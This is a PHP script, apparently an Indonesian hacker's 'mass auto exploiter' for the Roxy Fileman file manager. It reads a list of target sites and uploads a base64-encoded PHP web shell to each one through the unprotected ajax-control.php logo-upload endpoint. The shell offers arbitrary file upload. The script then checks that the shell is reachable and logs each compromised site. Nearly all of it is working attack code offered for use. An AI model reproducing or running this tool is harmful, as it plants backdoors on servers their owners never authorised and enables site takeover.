<?php
# Created By N4ST4R_ID
# Recode? lo ampas tq hehe
# Atur sendiri nama shell klu lo mau jg
class Exployit {
	
	private $cih, 
	        $opt, 
	        $sex, 
	        $shek,
	        $shell = "2021.php";
		
	public function ngews($lis) {
		$this->saveme($this->shell, "w", base64_decode("PD9waHAKZWNobyAiPGI+Ul8xOTkxMTkgOik8L2I+IjsKZWNobyAiPGJyPiIucGhwX3VuYW1lKCkuIjxicj4iOwplY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPgo8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0nbmFzdGFyJz48aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd1cGxvYWQnIHZhbHVlPSd1cGxvYWQnPgo8L2Zvcm0+IjsKaWYoJF9QT1NUWyd1cGxvYWQnXSkgewoJaWYoQGNvcHkoJF9GSUxFU1snbmFzdGFyJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ25hc3RhciddWyduYW1lJ10pKSB7CgllY2hvICJvayI7Cgl9IGVsc2UgewoJZWNobyAiZ2dsIjsKCX0KfQo/Pg=="));
		print "[*] Exploiting ".$lis."\n";
		$njay = $lis."/includes/ajax-control.php";
		if($this->xoex($njay)->info == 200) {
			@shell_exec("curl --silent --connect-timeout 5 -X POST -F \"logoImage=@".$this->shell."\" \"$njay\"");
			$shex = $lis."/images/".$this->shell;
			if(preg_match("/R_199119/", $this->xoex($shex)->exe) AND $this->xoex($shex)->info == 200) {
				print "[+] Success upload shell > ".$shex."\n";
				$this->saveme("1.txt", "a+", $shex);
				if(file_exists("1.txt")) {
					print "[+] Success save the result in result.txt\n\n";
				}
			} else {
				print "[-] Upload shell failed :'( > ".$lis."\n\n";
			}
		} else {
			print "[-] File upload.php not found ".$lis."\n\n";
		}
	}
	
	private function xoex($jncx) {
		$this->cih = curl_init();
		$this->opt = 
                [
		 CURLOPT_URL            => $jncx,
		 CURLOPT_SSL_VERIFYHOST => false,
		 CURLOPT_SSL_VERIFYPEER => false,
		 CURLOPT_CONNECTTIMEOUT => 5,
		 CURLOPT_TIMEOUT        => 5,
		 CURLOPT_RETURNTRANSFER => true
		];
		curl_setopt_array($this->cih, $this->opt);
		$this->sex = curl_exec($this->cih);
		$this->shek = curl_getinfo($this->cih, CURLINFO_HTTP_CODE);
		curl_close($this->cih);
		return (object)
		[
		 "info" => $this->shek,
		 "exe"  => $this->sex
		];
	}
	
	public function bannedlo () {
		print "
          ____              
         |  _ \ _____  ___   _ 
         | |_) / _ \ \/ / | | | Filemanager
         |  _ < (_) >  <| |_| | Mass auto
         |_| \_\___/_/\_\\\__, | Exploiter
                         |___/
                         
         Coded by     : N4ST4R_ID
         Github       : https://github.com/nastar-id
         Facebook     : Muhammad Rasyad
         Blog         : https://www.nyamuxpl0it.cf
         Attention    : Put your sites in list.txt 'site.com/path-to-roxyfm/'
         For example  : https://www.nyamuxpl0it.cf/admin/fileman/
         \n";
	}
	
	private function saveme($asu, $asw, $asuw) {
		$su = fopen($asu, $asw);
		fwrite($su, $asuw."\n");
		fclose($su);
	}
}

$pig = new Exployit();
system("clear");
$pig->bannedlo();
if(empty($argv[1])) exit("[-] Usage: php {$argv[0]} list.txt\n");
if(empty(file_exists($argv[1]))) exit("[-] File {$argv[1]} not found!\n");
$trog = trim($argv[1]);
$getex = explode("\n", file_get_contents($trog));
foreach($getex as $ketex) {
	$pig->ngews($ketex);
}
?>
